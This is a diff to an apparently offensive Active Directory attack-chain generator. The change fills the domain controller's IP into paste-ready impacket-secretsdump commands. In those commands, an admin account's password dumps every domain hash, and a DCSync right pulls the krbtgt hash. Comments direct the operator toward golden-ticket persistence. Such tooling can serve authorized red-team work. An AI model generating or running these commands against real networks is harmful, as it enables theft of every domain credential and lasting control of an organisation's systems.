@@ -706,6 +706,7 @@ def run(report, store, ui=None):
                     best_src, best_line = _s, _l
                     break
             _dom_ac = store.dominant_domain() or "<dom>"
+            _dc_ac = store.dc_ip() or "<DC-IP>"
             via = admincount_via.get(ulc, "")
             via_note = f" via '{via}'" if via else " (admincount=1)"
             chains.append(Chain("R-ADMIN-CRED", "already-DA cred",
@@ -713,7 +714,7 @@ def run(report, store, ui=None):
                 crit=10, conf=0.95, ready=1.5, prox=1.0,         # score 14.25
                 commands=[
                     f"# BloodHound flags {ulc} as tier-0{via_note}",
-                    f"impacket-secretsdump '{_dom_ac}/{ulc}:{pw}'@<DC-IP>",
+                    f"impacket-secretsdump '{_dom_ac}/{ulc}:{pw}'@{_dc_ac}",
                     f"# if that works you have every domain hash - proceed to "
                     f"R-GOLDEN for persistence",
                 ], src=best_src, line=best_line))
@@ -812,6 +813,7 @@ def run(report, store, ui=None):
                     continue
                 seen.add(dcsync_key)
                 _dom_ds = store.dominant_domain() or "<DOM>"
+                _dc_ds = store.dc_ip() or "<DC-IP>"
                 # iter-39: use resolved principal name in owned-user slot
                 # when known, so the operator can paste directly.
                 chains.append(Chain("R-DCSYNC", "direct DCSync via ACL",
@@ -822,7 +824,7 @@ def run(report, store, ui=None):
                         (f"# principal (SID {_psid})" if not _pname else
                          f"# principal resolved -> '{_pname}'"),
                         f"impacket-secretsdump -just-dc-user krbtgt "
-                        f"'{_dom_ds}/{_owned}:<password>'@<DC-IP>",
+                        f"'{_dom_ds}/{_owned}:<password>'@{_dc_ds}",
                         f"# with krbtgt hash, next: R-GOLDEN chain",
                     ], src=edge["src"], line=edge["line"]))
                 continue
